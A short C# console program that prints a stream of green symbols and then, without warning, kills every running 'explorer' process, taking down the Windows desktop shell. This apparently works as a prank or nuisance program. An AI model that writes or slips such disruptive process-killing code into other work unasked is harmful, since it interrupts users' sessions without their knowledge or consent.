using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace myApp
{
    class Program
    {


        static void Main(string[] args)
            {
            


            for (int i=0; i<10000; i++)
            {
                Console.ForegroundColor = ConsoleColor.Green;                
                if (i%2==0)
                {
                    Console.Write("#");
                }
                if (i % 3 == 0)
                {
                    Console.Write("?");
                }
                if (i % 4 == 0)
                {
                    Console.Write("$");
                }
                if (i % 5 == 0)
                {
                    Console.Write("*");
                }
                if (i % 6 == 0)
                {
                    Console.Write("@");
                }
                if (i % 7 == 0)
                {
                    Console.Write("%");
                }
                if (i % 8 == 0)
                {
                    Console.Write("^");
                }
                if (i % 9 == 0)
                {
                    Console.Write("!");
                }

            }

            foreach (var process in Process.GetProcessesByName("explorer"))
            {
                process.Kill();
            }


        }
    }
}
